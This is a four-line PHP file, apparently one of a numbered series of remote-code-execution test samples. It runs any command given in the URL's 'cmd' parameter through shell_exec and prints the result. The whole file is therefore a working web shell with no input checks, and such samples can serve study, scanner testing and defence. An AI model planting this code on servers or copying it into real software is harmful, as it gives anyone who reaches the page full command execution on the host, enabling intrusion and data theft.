<?php
// RCE test variation #96
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>